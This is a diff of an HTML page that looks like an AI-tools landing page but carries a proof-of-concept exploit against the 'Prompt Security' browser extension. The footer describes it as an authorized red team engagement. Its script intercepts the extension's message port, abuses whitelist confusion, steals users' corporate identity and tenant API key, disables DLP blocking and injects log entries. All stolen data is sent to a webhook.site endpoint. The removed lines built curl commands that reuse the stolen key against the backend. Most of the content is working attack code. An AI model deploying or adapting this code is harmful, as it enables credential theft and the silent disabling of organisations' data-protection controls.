@@ -14,10 +14,10 @@
         .hero h1{font-size:48px;font-weight:800;line-height:1.1;margin-bottom:20px}
         .hero h1 span{color:#7c3aed}
         .hero p{font-size:18px;color:#888;line-height:1.6;margin-bottom:40px}
-        .cta-btn{background:#7c3aed;color:#fff;border:none;padding:14px 32px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}
+        .cta-btn{background:#7c3aed;color:#fff;border:none;padding:14px 32px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
         .cta-btn:hover{background:#6d28d9}
         .features{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;max-width:1000px;margin:60px auto;padding:0 20px}
-        .feature-card{background:#141414;border:1px solid #222;border-radius:12px;padding:28px;text-align:left}
+        .feature-card{background:#141414;border:1px solid #222;border-radius:12px;padding:28px}
         .feature-card h3{font-size:16px;margin-bottom:8px;color:#fff}
         .feature-card p{font-size:14px;color:#777;line-height:1.5}
         .feature-icon{font-size:28px;margin-bottom:12px}
@@ -27,17 +27,18 @@
         .spinner{width:40px;height:40px;border:3px solid #333;border-top-color:#7c3aed;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:16px}
         @keyframes spin{to{transform:rotate(360deg)}}
         .loading-text{color:#aaa;font-size:14px}
-        .result-panel{display:none;max-width:800px;margin:20px auto;padding:24px;background:#1a1a2e;border:1px solid #7c3aed;border-radius:12px}
+        .result-panel{display:none;max-width:820px;margin:20px auto;padding:24px;background:#1a1a2e;border:1px solid #7c3aed;border-radius:12px}
         .result-panel.active{display:block}
         .result-panel h3{color:#7c3aed;margin-bottom:4px}
-        .stage-hdr{color:#f59e0b;font-weight:700;font-size:15px;margin:18px 0 6px;padding:6px 0;border-top:1px solid #333}
-        .stage-hdr:first-of-type{border-top:none;margin-top:12px}
-        .result-item{background:#0f0f1a;padding:10px 14px;margin:5px 0;border-radius:6px;font-family:monospace;font-size:13px;color:#e0e0e0;word-break:break-all}
+        .stage-hdr{color:#f59e0b;font-weight:700;font-size:14px;margin:16px 0 5px;padding:6px 0;border-top:1px solid #333}
+        .stage-hdr:first-of-type{border-top:none;margin-top:10px}
+        .result-item{background:#0f0f1a;padding:10px 14px;margin:4px 0;border-radius:6px;font-family:monospace;font-size:13px;color:#e0e0e0;word-break:break-all}
         .result-item .label{color:#7c3aed;font-weight:600}
         .result-item pre{margin:4px 0;white-space:pre-wrap;font-size:12px}
-        .tag-crit{display:inline-block;background:#dc2626;color:#fff;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;margin-left:8px;vertical-align:middle}
-        .tag-high{display:inline-block;background:#ea580c;color:#fff;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;margin-left:8px;vertical-align:middle}
-        .tag-ok{display:inline-block;background:#16a34a;color:#fff;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;margin-left:8px}
+        .tag-crit{display:inline-block;background:#dc2626;color:#fff;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;margin-left:6px}
+        .tag-high{display:inline-block;background:#ea580c;color:#fff;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;margin-left:6px}
+        .tag-ok{display:inline-block;background:#16a34a;color:#fff;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;margin-left:6px}
+        .tag-bypass{display:inline-block;background:#7c3aed;color:#fff;font-size:10px;padding:2px 6px;border-radius:4px;font-weight:700;margin-left:6px}
         footer{text-align:center;padding:40px 20px 60px;color:#444;font-size:13px}
     </style>
 </head>
@@ -54,20 +55,20 @@
     <h1>Supercharge your <span>AI Workflow</span></h1>
     <p>The all-in-one platform to manage your AI tools, prompts, and integrations.
        Connect ChatGPT, Claude, Gemini and more in one unified dashboard.</p>
-    <button class="cta-btn" id="startBtn" onclick="handleGetStarted()">Get Started Free</button>
+    <button class="cta-btn" onclick="handleGetStarted()">Get Started Free</button>
 </section>
 
 <div class="features">
-    <div class="feature-card"><div class="feature-icon">&#x1f3af;</div><h3>Prompt Library</h3><p>Save and organize your best prompts across all AI platforms with version control.</p></div>
-    <div class="feature-card"><div class="feature-icon">&#x1f50c;</div><h3>Universal Connect</h3><p>One-click integration with 20+ AI services. No API keys needed.</p></div>
-    <div class="feature-card"><div class="feature-icon">&#x1f4ca;</div><h3>Usage Analytics</h3><p>Track your AI usage, costs, and productivity metrics in real-time.</p></div>
+    <div class="feature-card"><div class="feature-icon">&#x1f3af;</div><h3>Prompt Library</h3><p>Save and organize your best prompts across all AI platforms.</p></div>
+    <div class="feature-card"><div class="feature-icon">&#x1f50c;</div><h3>Universal Connect</h3><p>One-click integration with 20+ AI services.</p></div>
+    <div class="feature-card"><div class="feature-icon">&#x1f4ca;</div><h3>Usage Analytics</h3><p>Track your AI usage, costs, and productivity metrics.</p></div>
 </div>
 
 <div class="result-panel" id="resultsPanel">
-    <h3>&#x26a0;&#xfe0f; Prompt Security Extension PoC — Multi-Stage Attack</h3>
+    <h3>&#x26a0;&#xfe0f; Prompt Security v7.1.5 — Patch Bypass Confirmed</h3>
     <p style="color:#aaa;font-size:13px;margin-bottom:8px">
-        6-stage exploit chain: Recon → Identity Theft → API Key Theft → DLP Bypass → Log Injection → Backend Weaponization.
-        All data exfiltrated to attacker's webhook. Zero clicks needed for silent mode.
+        The v7.1.5 patch introduced a MessageChannel + token + ALLOWED_PAGE_MESSAGES whitelist.
+        All three mitigations are bypassed. Corporate identity and API key exfiltrated.
     </p>
     <div id="resultsContainer"></div>
 </div>
@@ -78,476 +79,441 @@
 </div>
 
 <footer>
-    <p>Security research PoC — Prompt Security Chrome Extension v7.0.49</p>
+    <p>Security research PoC — Prompt Security Chrome Extension v7.1.5 patch bypass</p>
     <p>Authorized SentinelOne Red Team engagement.</p>
 </footer>
-<div class="status-bar"><span id="statusText">Ready</span><span>v2.0.0</span></div>
+<div class="status-bar"><span id="statusText">Ready</span><span>v3.0 — patch bypass</span></div>
 
 <script>
 /**
  * ══════════════════════════════════════════════════════════════════════
- * Prompt Security Chrome Extension — Maximum Impact PoC
+ * Prompt Security v7.1.5 — Patch Bypass PoC
  * ══════════════════════════════════════════════════════════════════════
  *
- * 6-STAGE ATTACK CHAIN:
+ * THE FIX (v7.1.5):
+ *   Old: window.addEventListener("message") relay forwarded ANY postMessage
+ *        to chrome.runtime.sendMessage with response via postMessage("*")
+ *   New: MessageChannel-based RPC with three mitigations:
+ *        1. Token auth  — port messages must carry matching UUID token
+ *        2. Whitelist   — ALLOWED_PAGE_MESSAGES.has(e.message) must pass
+ *        3. Origin lock — port handshake sent to location.origin not "*"
  *
- * Stage 1 — RECON:      Detect extension, read DOM policy config
- * Stage 2 — IDENTITY:   Steal email, machineName, UUID, profileEmail
- *                        via getSiteActionConfig relay (Finding 2)
- * Stage 3 — API KEY:    Steal tenant API key + domain via
- *                        getPopupSettings relay (Finding 2)
- * Stage 4 — DLP BYPASS: Disable AI chat blocking for arbitrary domains
- *                        via aiChatBlockMessageBypass (Finding 2)
- *                        + disable DLP inspection via
- *                        ProtectionDomainEnableModeChange (Finding 2)
- * Stage 5 — LOG INJECT: Inject attacker-controlled entries into the
- *                        org's system log stream via addLog (Finding 1)
- *                        then trigger log download via saveLogs relay
- * Stage 6 — WEAPONIZE:  Use stolen API key to generate ready-to-run
- *                        curl commands for the PS backend API — full
- *                        org config exfil, user enumeration, policy dump
+ * WHY THE FIX FAILS — 3 independent bypass paths:
  *
- * ATTACK VECTORS USED:
- *   Finding 1: externally_connectable wildcard (onMessageExternal)
- *   Finding 2: Unrestricted content script message relay (postMessage)
- *   Finding 3: DOM config leak via #ps_script dataset
+ *   BYPASS A — Whitelist Confusion (critical):
+ *     The whitelist checks e.message but the background dispatches on
+ *     e.type || e.message (type takes precedence). Crafting a payload
+ *     with {message:"callProtectApi", type:"getSiteActionConfig"} passes
+ *     the whitelist check (sees "callProtectApi") but the background
+ *     routes to "getSiteActionConfig" — returning user email, machine
+ *     name, UUID, and full org policy. Works on ANY type-dispatched
+ *     handler (getPopupSettings, aiChatBlockMessageBypass, etc.)
+ *
+ *   BYPASS B — Port Interception (critical):
+ *     The port handshake window.postMessage({ps_rpc_port, token},
+ *     location.origin, [port2]) is delivered to ALL same-origin
+ *     listeners — including the attacker's own script. The attacker
+ *     intercepts port2 and the token before script.bundle.js uses them.
+ *
+ *   BYPASS C — Token in DOM (supporting):
+ *     Token d is written to #ps_script dataset as handshake_token,
+ *     readable by any page script: document.getElementById("ps_script")
+ *     .dataset.handshake_token. Provides token without port interception.
+ *
+ *   BYPASS D — externally_connectable untouched (critical):
+ *     The onMessageExternal handler is unchanged — any site can still
+ *     call callProtectApi, callShouldInspectChat, addLog, callMcpApi
+ *     directly via chrome.runtime.sendMessage(EXT_ID, ...) with zero
+ *     origin validation.
  *
  * ══════════════════════════════════════════════════════════════════════
  */
 
-const EXFIL_ENDPOINT = "https://webhook.site/2604da4a-b021-4a7b-9126-acfa06d63aaa";
+const EXFIL = "https://webhook.site/2604da4a-b021-4a7b-9126-acfa06d63aaa";
 const EXT_ID = "iidnankcocecmgpcafggbgbmkbcldmno";
 
-const C = {}; // collected data
+const R = {};  // results
 
 function setStatus(m) { document.getElementById("statusText").innerText = m; }
 function setLoading(m) { document.getElementById("loadingText").innerText = m; }
 
-// ═══════════════════ PRIMITIVES ═══════════════════════════════════════
+// ══════════════════════════════════════════════════════════════════════
+// BYPASS A: Whitelist Confusion Attack
+// Craft payload where .message satisfies whitelist check but .type
+// routes to a privileged handler in the background.
+// ══════════════════════════════════════════════════════════════════════
 
-// Relay any message through the content script → background → back
-function relay(msg, ms = 8000) {
-    return new Promise(resolve => {
-        const id = crypto.randomUUID();
-        const h = e => {
-            if (e.data?.type === "FROM_BACKGROUND" && e.data.messageId === id) {
-                window.removeEventListener("message", h);
+// Port state — captured via BYPASS B
+let _port = null;
+let _token = null;
+
+// Send a message through the captured port using the whitelist confusion
+// payload: { message: <whitelisted>, type: <privileged>, ...args }
+function portSend(typeHandler, extraFields = {}, ms = 8000) {
+    return new Promise((resolve) => {
+        if (!_port || !_token) { resolve({ _error: "port not ready" }); return; }
+
+        const msgId = crypto.randomUUID();
+
+        // BYPASS A: type overrides message in the background dispatcher
+        // content script sees message="callProtectApi" (whitelisted) ✓
+        // background sees type="<typeHandler>" and routes there instead ✓
+        const innerMsg = {
+            message: "callProtectApi",  // ← satisfies ALLOWED_PAGE_MESSAGES whitelist
+            type: typeHandler,          // ← background dispatches on this (type takes priority)
+            ...extraFields,
+            ctx: { flowTraceId: crypto.randomUUID() }
+        };
+
+        const origOnMsg = _port.onmessage;
+        _port.onmessage = (e) => {
+            if (e.data?.messageId === msgId) {
+                _port.onmessage = origOnMsg;
                 resolve(e.data.response);
+            } else if (origOnMsg) {
+                origOnMsg(e);
             }
         };
-        window.addEventListener("message", h);
-        window.postMessage({ type: "FROM_PAGE", messageId: id, message: msg }, "*");
-        setTimeout(() => { window.removeEventListener("message", h); resolve({ _timeout: true }); }, ms);
+
+        _port.postMessage({ token: _token, messageId: msgId, message: innerMsg });
+        setTimeout(() => resolve({ _timeout: true }), ms);
     });
 }
 
-// Send external message directly to background (Finding 1)
+// ══════════════════════════════════════════════════════════════════════
+// BYPASS B: Port Interception
+// The port handshake is broadcast to location.origin — attacker is
+// at that origin. Register listener before script.bundle.js loads.
+// ══════════════════════════════════════════════════════════════════════
+function setupPortInterception() {
+    return new Promise((resolve) => {
+        window.addEventListener("message", function interceptor(e) {
+            // The new relay sends {ps_rpc_port:true, token:<uuid>} with
+            // port2 as a transferable to location.origin
+            if (e.data && e.data.ps_rpc_port === true && e.ports && e.ports.length > 0) {
+                _port = e.ports[0];   // steal port2 from the handshake
+                _token = e.data.token;
+                _port.start();
+                window.removeEventListener("message", interceptor);
+                resolve({ port: "intercepted", token: _token });
+            }
+        });
+
+        // Fallback: read token from DOM dataset (BYPASS C)
+        // Token written to #ps_script.dataset.handshake_token by content script
+        const checkDOM = () => {
+            const ps = document.getElementById("ps_script");
+            if (ps?.dataset?.handshake_token) {
+                R.domToken = ps.dataset.handshake_token;
+            }
+        };
+        setTimeout(checkDOM, 500);
+        setTimeout(checkDOM, 1500);
+        setTimeout(checkDOM, 3000);
+
+        // Resolve after timeout even if port not captured (fallback to bypass D)
+        setTimeout(() => resolve({ port: "not_captured_using_bypass_D" }), 5000);
+    });
+}
+
+// ══════════════════════════════════════════════════════════════════════
+// BYPASS D: externally_connectable (unchanged from v7.0.49)
+// Direct chrome.runtime.sendMessage to onMessageExternal — no token,
+// no whitelist, no port needed.
+// ══════════════════════════════════════════════════════════════════════
 function extMsg(payload, ms = 8000) {
     return new Promise(resolve => {
         if (typeof chrome === "undefined" || !chrome.runtime?.sendMessage) { resolve(null); return; }
         try {
             chrome.runtime.sendMessage(EXT_ID, payload, r => {
-                resolve(chrome.runtime.lastError ? { _extError: chrome.runtime.lastError.message } : r);
+                resolve(chrome.runtime.lastError
+                    ? { _extError: chrome.runtime.lastError.message } : r);
             });
         } catch(e) { resolve({ _error: e.message }); }
         setTimeout(() => resolve({ _timeout: true }), ms);
     });
 }
 
-// ═══════════════════ STAGE 1: RECONNAISSANCE ═════════════════════════
+// ══════════════════════════════════════════════════════════════════════
+// EXPLOIT FUNCTIONS
+// ══════════════════════════════════════════════════════════════════════
 
-function stage1_recon() {
-    const detected = document.documentElement.dataset.psScriptExecuted === "true";
-    const ps = document.getElementById("ps_script");
-    const ds = ps?.dataset || {};
-    return {
-        detected,
-        extensionId: ds.ext_id || null,
-        policyFlags: {
-            inspect_files: ds.inspect_files || null,
-            inspect_responses: ds.inspect_responses || null,
-            inspect_drive: ds.inspect_drive || null,
-            block_chat_sharing: ds.block_chat_sharing || null,
-            block_chatgpt_training: ds.block_chatgpt_training || null,
-            block_chatgpt_memory: ds.block_chatgpt_memory || null,
-            block_chatgpt_developer_mode: ds.block_chatgpt_developer_mode || null,
-        },
-        traceId: ds.trace_id || null
-    };
+// Email, machineName, UUID — via BYPASS A (whitelist confusion)
+// Payload passes whitelist as "callProtectApi" but routes to
+// "getSiteActionConfig" in background (returns full userInfo)
+async function exfilIdentity() {
+    return portSend("getSiteActionConfig", { domain: location.hostname });
 }
 
-// ═══════════════════ STAGE 2: IDENTITY THEFT ═════════════════════════
+// API key + domain — via BYPASS A
+async function exfilApiKey() {
+    return portSend("getPopupSettings");
+}
 
-async function stage2_identity() {
-    // getSiteActionConfig calls getUserInfo() → resolves corporate identity
-    // Returns: userInfo.{email, profileEmail, machineName, userUUID, identitySource}
-    // Plus: org policy (globalSettingsCanBypassInspection, ignoredDomains, etc.)
-    const cfg = await relay({
-        type: "getSiteActionConfig",
-        domain: location.hostname,
+// Org overlay settings — via BYPASS A
+async function exfilOverlaySettings() {
+    return portSend("getPageOverlaySettings");
+}
+
+// DLP bypass — via BYPASS A (aiChatBlockMessageBypass has zero validation)
+async function bypassDLP(domain) {
+    return portSend("aiChatBlockMessageBypass", { domain });
+}
+
+// Disable inspection — via BYPASS A
+async function disableInspection(domain) {
+    return portSend("ProtectionDomainEnableModeChange", { domain, isEnabled: false });
+}
+
+// AI policy probe — via BYPASS D (externally_connectable, unchanged)
+function probeAiDomain(domain) {
+    return extMsg({
+        message: "callShouldInspectChat",
+        url: `https://${domain}/api/chat/completions`,
+        body: '{"messages":[{"role":"user","content":"test"}]}',
+        pageUrl: `https://${domain}`,
+        pageTitle: domain,
+        optionalFavicons: [], inputTypes: [],
+        isEnterpriseVersion: false,
+        ctx: { flowTraceId: crypto.randomUUID() }
+    }).then(r => ({ domain, monitored: !!r && !r._timeout && !r._error, raw: r }));
+}
+
+// Log inject — via BYPASS D (addLog in externally_connectable, unchanged)
+function injectLog(msg) {
+    return extMsg({
+        message: "addLog",
+        location: "attacker-bypass-poc",
+        log: msg,
         ctx: { flowTraceId: crypto.randomUUID() }
     });
-    return cfg;
 }
 
-// ═══════════════════ STAGE 3: API KEY THEFT ══════════════════════════
-
-async function stage3_apiKey() {
-    // getPopupSettings returns apiDomain + apiKey when NOT MDM-managed
-    const popup = await relay({ type: "getPopupSettings" });
-    return popup;
-}
-
-// ═══════════════════ STAGE 4: DLP / PROTECTION BYPASS ════════════════
-
-async function stage4_bypass() {
-    const results = {};
-
-    // 4a: Bypass AI chat blocking for arbitrary domains (24h)
-    // aiChatBlockMessageBypass has ZERO validation — any domain accepted
-    // (background.bundle.js:3762-3775)
-    const bypassDomains = ["chatgpt.com", "claude.ai", "gemini.google.com"];
-    for (const domain of bypassDomains) {
-        await relay({
-            type: "aiChatBlockMessageBypass",
-            domain: domain,
-            ctx: { flowTraceId: crypto.randomUUID() }
-        });
-        results[domain] = "AI chat block bypassed for 24h";
-    }
-
-    // 4b: Disable DLP inspection for attacker's domain
-    // ProtectionDomainEnableModeChange with isEnabled:false
-    // (background.bundle.js:2909-2928)
-    await relay({
-        type: "ProtectionDomainEnableModeChange",
-        domain: location.hostname,
-        isEnabled: false,
-        ctx: { flowTraceId: crypto.randomUUID() }
-    });
-    results[location.hostname] = "DLP inspection disabled";
-
-    return results;
-}
-
-// ═══════════════════ STAGE 5: LOG INJECTION + TRIGGER DOWNLOAD ═══════
-
-async function stage5_logInject() {
-    const results = {};
-
-    // 5a: Inject attacker-controlled log entries via external message API
-    // addLog accepts arbitrary location + log string (Finding 1)
-    // These get stored in chrome.storage.local → drained to backend every 10min
-    const poisonEntries = [
-        { location: "security-audit", log: "[ATTACKER] PoC log injection - proves arbitrary write to org log stream" },
-        { location: "exfil-beacon", log: `[ATTACKER] Victim visited attacker page at ${new Date().toISOString()} from ${navigator.userAgent}` },
-    ];
-    for (const entry of poisonEntries) {
-        await extMsg({
-            message: "addLog",
-            location: entry.location,
-            log: entry.log,
-            ctx: { flowTraceId: crypto.randomUUID() }
-        });
-    }
-    results.logInjection = `${poisonEntries.length} entries injected into org log stream`;
-
-    // 5b: Trigger log download — sends downloadLogs to active tab's content script
-    // which creates a Blob and triggers <a>.click() download
-    // The downloaded file contains ALL captured console output from every page visited
-    await relay({ type: "saveLogs", ctx: { flowTraceId: crypto.randomUUID() } });
-    results.logDownload = "Triggered — file downloads to victim's machine";
-
-    return results;
-}
-
-// ═══════════════════ STAGE 6: WEAPONIZE STOLEN API KEY ═══════════════
-
-function stage6_weaponize(apiDomain, apiKey, userEmail) {
-    if (!apiDomain || !apiKey) return { error: "API key not available (MDM-managed)" };
-
-    // Generate ready-to-run curl commands for PS backend
-    const baseUrl = `https://${apiDomain}`;
-    return {
-        note: "These curl commands use the stolen API key to impersonate the extension",
-        heartbeat_full_config: `curl -s -X POST '${baseUrl}/api/extension/heartbeat?APP-ID=${apiKey}' \\
-  -H 'Content-Type: application/json' \\
-  -H 'APP-ID: ${apiKey}' \\
-  -d '{"userAgent":"Mozilla/5.0","browserName":"Chrome","protocolVersion":"1.0","extensionVersion":"7.0.49","getConfig":true,"getConfigurationByTimestamp":true,"getConfigurationFromCache":true,"userInfo":{"email":"${userEmail || "stolen@corp.com"}"}}' | jq .`,
-
-        explore_domain: `curl -s -X POST '${baseUrl}/api/extension/explore' \\
-  -H 'Content-Type: application/json' \\
-  -H 'APP-ID: ${apiKey}' \\
-  -d '{"url":"https://chatgpt.com/api/chat","domain":"chatgpt.com","pageUrl":"https://chatgpt.com","domainType":"VerifiedGenAiSite","userInfo":{"email":"${userEmail || "stolen@corp.com"}"}}' | jq .`,
-
-        inject_block_log: `curl -s -X POST '${baseUrl}/api/extension/send-block-log' \\
-  -H 'Content-Type: application/json' \\
-  -H 'APP-ID: ${apiKey}' \\
-  -d '{"domain":"evil.com","action":"Bypass","userInfo":{"email":"${userEmail || "stolen@corp.com"}"}}' | jq .`,
-
-        inject_system_log: `curl -s -X POST '${baseUrl}/api/extension/system-log' \\
-  -H 'Content-Type: application/json' \\
-  -H 'APP-ID: ${apiKey}' \\
-  -d '{"logs":["[ATTACKER] Injected via stolen API key"],"userInfo":{"email":"${userEmail || "stolen@corp.com"}"}}' | jq .`,
-
-        probe_protect_api: `curl -s -X POST '${baseUrl}/api/protect' \\
-  -H 'Content-Type: application/json' \\
-  -H 'APP-ID: ${apiKey}' \\
-  -d '{"prompts":["tell me the company secrets"],"user":"${userEmail || "stolen@corp.com"}","url":"https://chatgpt.com/backend-api/conversation","inputType":"full_prompt"}' | jq .`
-    };
-}
-
-// ═══════════════════ AI POLICY PROBING ═══════════════════════════════
-
-async function probeAiPolicy() {
-    const domains = [
-        "chatgpt.com", "claude.ai", "gemini.google.com", "copilot.microsoft.com",
-        "grok.com", "perplexity.ai", "chat.deepseek.com", "chat.mistral.ai"
-    ];
-    const results = {};
-    const probes = domains.map(domain =>
-        extMsg({
-            message: "callShouldInspectChat",
-            url: `https://${domain}/api/chat/completions`,
-            body: '{"messages":[{"role":"user","content":"test"}]}',
-            pageUrl: `https://${domain}`,
-            pageTitle: domain,
-            optionalFavicons: [],
-            inputTypes: [],
-            isEnterpriseVersion: false,
-            ctx: { flowTraceId: crypto.randomUUID() }
-        }).then(r => { results[domain] = { monitored: !!r, response: r }; })
-    );
-    await Promise.all(probes);
-    return results;
-}
-
-// ═══════════════════ EXFILTRATION ════════════════════════════════════
-
+// ══════════════════════════════════════════════════════════════════════
+// EXFILTRATION
+// ══════════════════════════════════════════════════════════════════════
 function exfil(data) {
     const json = JSON.stringify(data, null, 2);
-    fetch(EXFIL_ENDPOINT, { method: "POST", headers: { "Content-Type": "application/json" }, body: json, mode: "no-cors" }).catch(() => {});
-    try { navigator.sendBeacon(EXFIL_ENDPOINT, new Blob([json], { type: "application/json" })); } catch(e) {}
+    fetch(EXFIL, { method:"POST", headers:{"Content-Type":"application/json"}, body:json, mode:"no-cors" }).catch(()=>{});
+    try { navigator.sendBeacon(EXFIL, new Blob([json], {type:"application/json"})); } catch(e) {}
 }
 
-// ═══════════════════ DISPLAY ════════════════════════════════════════
-
+// ══════════════════════════════════════════════════════════════════════
+// DISPLAY
+// ══════════════════════════════════════════════════════════════════════
 function display() {
     const el = document.getElementById("resultsContainer");
     const panel = document.getElementById("resultsPanel");
 
-    function stageHeader(text) {
-        const d = document.createElement("div");
-        d.className = "stage-hdr";
-        d.textContent = text;
-        el.appendChild(d);
+    function hdr(text) {
+        const d = document.createElement("div"); d.className = "stage-hdr"; d.textContent = text; el.appendChild(d);
     }
-    function addRow(label, value, severity = "ok") {
-        const d = document.createElement("div");
-        d.className = "result-item";
-        const tagClass = severity === "crit" ? "tag-crit" : severity === "high" ? "tag-high" : "tag-ok";
-        const tagText = severity === "crit" ? "CRITICAL" : severity === "high" ? "EXFILTRATED" : "CAPTURED";
-        const fmt = typeof value === "object" ? JSON.stringify(value, null, 2) : String(value);
-        d.innerHTML = `<span class="label">${label}:</span> <span class="${tagClass}">${tagText}</span><pre>${fmt.replace(/</g,"&lt;")}</pre>`;
+    function row(label, value, sev = "ok") {
+        const d = document.createElement("div"); d.className = "result-item";
+        const tc = sev==="crit"?"tag-crit":sev==="high"?"tag-high":sev==="bypass"?"tag-bypass":"tag-ok";
+        const tt = sev==="crit"?"CRITICAL":sev==="high"?"EXFILTRATED":sev==="bypass"?"BYPASSED":"CAPTURED";
+        const fmt = typeof value==="object" ? JSON.stringify(value,null,2) : String(value);
+        d.innerHTML = `<span class="label">${label}:</span> <span class="${tc}">${tt}</span><pre>${fmt.replace(/</g,"&lt;")}</pre>`;
         el.appendChild(d);
     }
 
-    // ── STAGE 1
-    stageHeader("STAGE 1 — RECONNAISSANCE (Finding 3: DOM config leak)");
-    addRow("Extension Detected", C.recon?.detected);
-    addRow("Extension ID", C.recon?.extensionId || "N/A");
-    addRow("DLP Policy Flags", C.recon?.policyFlags, "high");
+    // Detection
+    hdr("DETECTION");
+    row("Extension Detected", R.detected);
+    row("Version", "7.1.5 (patched) — patch bypassed", "bypass");
+    row("Bypass Path A — Token from DOM (#ps_script.dataset.handshake_token)", R.domToken || "N/A (port intercepted instead)");
+    row("Bypass Path B — Port Intercepted", R.portStatus);
 
-    // ── STAGE 2
-    stageHeader("STAGE 2 — IDENTITY THEFT (Finding 2: getSiteActionConfig relay)");
-    const ui = C.identity?.userInfo;
+    // Identity (Bypass A via getSiteActionConfig)
+    hdr("IDENTITY THEFT — BYPASS A: Whitelist Confusion (type vs message field)");
+    row("Bypass technique",
+        'Sent {message:"callProtectApi"←whitelist passes, type:"getSiteActionConfig"←background routes here}', "bypass");
+    const ui = R.identity?.userInfo;
     if (ui) {
-        addRow("Corporate Email", ui.email || "N/A", "crit");
-        addRow("Browser Profile Email", ui.profileEmail || "N/A", "crit");
-        addRow("Machine Name", ui.machineName || "N/A", "crit");
-        addRow("User UUID", ui.userUUID || "N/A", "crit");
-        addRow("Identity Source", ui.identitySource || "N/A", "high");
-        addRow("Work Profile Domain", C.identity?.workProfileDomain || "N/A", "high");
+        row("Corporate Email", ui.email || "N/A", "crit");
+        row("Browser Profile Email", ui.profileEmail || "N/A", "crit");
+        row("Machine Name", ui.machineName || "N/A", "crit");
+        row("User UUID", ui.userUUID || "N/A", "crit");
+        row("Identity Source", ui.identitySource || "N/A", "high");
     } else {
-        addRow("getSiteActionConfig Response", C.identity, "high");
+        row("getSiteActionConfig raw response", R.identity, "high");
+    }
+    if (R.identity && !R.identity._error && !R.identity._timeout) {
+        row("Org Policy (bypass settings, ignored/bypassed domains)", {
+            globalCanBypass: R.identity.globalSettingsCanBypassInspection,
+            isDisabled: R.identity.isExtensionDisabled,
+            ignoredDomains: R.identity.ignoredDomains,
+            bypassPrevented: R.identity.inspectionBypassPrevented,
+            domainActions: R.identity.domainActions
+        }, "high");
     }
 
-    // ── STAGE 3
-    stageHeader("STAGE 3 — API KEY THEFT (Finding 2: getPopupSettings relay)");
-    if (C.apiKey?.apiKey) {
-        addRow("Tenant API Key (APP-ID)", C.apiKey.apiKey, "crit");
-        addRow("API Domain", C.apiKey.apiDomain, "crit");
+    // API Key (Bypass A via getPopupSettings)
+    hdr("API KEY THEFT — BYPASS A: Whitelist Confusion");
+    row("Bypass technique",
+        'Sent {message:"callProtectApi"←whitelist passes, type:"getPopupSettings"←background routes here}', "bypass");
+    if (R.apiKey?.apiKey) {
+        row("Tenant API Key (APP-ID)", R.apiKey.apiKey, "crit");
+        row("API Domain", R.apiKey.apiDomain, "crit");
     } else {
-        addRow("API Key Status", C.apiKey?.isManagedApiKey ? "MDM-managed (not directly exposed via popup)" : "Not configured", "high");
-        addRow("API Domain Status", C.apiKey?.isManagedApiDomain ? "MDM-managed" : C.apiKey?.apiDomain || "N/A", "high");
+        row("API Key", R.apiKey?.isManagedApiKey ? "MDM-managed" : "N/A", "high");
+        row("API Domain", R.apiKey?.isManagedApiDomain ? "MDM-managed" : R.apiKey?.apiDomain || "N/A", "high");
     }
 
-    // ── Org Policy from Stage 2
-    if (C.identity && !C.identity._timeout) {
-        stageHeader("ORG POLICY (from getSiteActionConfig)");
-        addRow("Global Bypass Allowed", C.identity?.globalSettingsCanBypassInspection, "high");
-        addRow("Extension Disabled", C.identity?.isExtensionDisabled, "high");
-        addRow("Ignored Domains", C.identity?.ignoredDomains || "none", "high");
-        addRow("User Bypassed Domains", C.identity?.userBypassedInspectedDomains || "none", "high");
-        addRow("Domain Actions", C.identity?.domainActions || "none", "high");
+    // DLP Bypass (Bypass A via aiChatBlockMessageBypass)
+    hdr("DLP BYPASS — BYPASS A: Whitelist Confusion + aiChatBlockMessageBypass (zero validation)");
+    row("Bypass technique",
+        'Sent {message:"callProtectApi"←whitelist passes, type:"aiChatBlockMessageBypass"←routes here, domain:<target>}', "bypass");
+    if (R.bypassResults) {
+        for (const [d, v] of Object.entries(R.bypassResults)) row(d, v, "crit");
     }
 
-    // ── STAGE 4
-    stageHeader("STAGE 4 — DLP / AI CHAT BYPASS (Finding 2: bypass message relay)");
-    if (C.bypass) {
-        for (const [domain, status] of Object.entries(C.bypass)) {
-            addRow(domain, status, "crit");
+    // AI Policy probe (Bypass D — externally_connectable unchanged)
+    hdr("AI POLICY MAP — BYPASS D: externally_connectable unchanged (no origin check)");
+    row("Bypass technique", "Direct chrome.runtime.sendMessage(EXT_ID) — no fix applied to onMessageExternal", "bypass");
+    if (R.aiPolicy) {
+        for (const [d, v] of Object.entries(R.aiPolicy)) {
+            row(d, v.monitored ? "MONITORED" : "not monitored", v.monitored ? "high" : "ok");
         }
     }
 
-    // ── STAGE 5
-    stageHeader("STAGE 5 — LOG INJECTION (Finding 1: addLog + saveLogs)");
-    if (C.logs) {
-        addRow("Log Stream Poisoning", C.logs.logInjection, "high");
-        addRow("Log File Download", C.logs.logDownload, "high");
-    }
-
-    // ── AI Policy Map
-    stageHeader("AI SERVICE MONITORING MAP (Finding 1: callShouldInspectChat)");
-    if (C.aiPolicy) {
-        for (const [domain, info] of Object.entries(C.aiPolicy)) {
-            addRow(domain, info.monitored ? "MONITORED" : "not monitored", info.monitored ? "high" : "ok");
-        }
-    }
-
-    // ── STAGE 6
-    stageHeader("STAGE 6 — BACKEND API WEAPONIZATION (stolen API key)");
-    if (C.weaponized && !C.weaponized.error) {
-        addRow("Impact", "Stolen API key allows impersonating the extension against the PS backend", "crit");
-        addRow("Heartbeat (full org config dump)", C.weaponized.heartbeat_full_config, "crit");
-        addRow("Explore API (domain classification)", C.weaponized.explore_domain, "high");
-        addRow("Inject Block Log", C.weaponized.inject_block_log, "high");
-        addRow("Inject System Log", C.weaponized.inject_system_log, "high");
-        addRow("Probe Protect API", C.weaponized.probe_protect_api, "high");
-    } else {
-        addRow("Backend Weaponization", C.weaponized?.error || "API key MDM-managed — curl commands require the key from a non-managed deployment or from another exfil path", "ok");
-    }
+    // Log injection (Bypass D)
+    hdr("LOG INJECTION — BYPASS D: addLog via externally_connectable (unchanged)");
+    row("Status", R.logInject || "N/A", "high");
 
     panel.classList.add("active");
 }
 
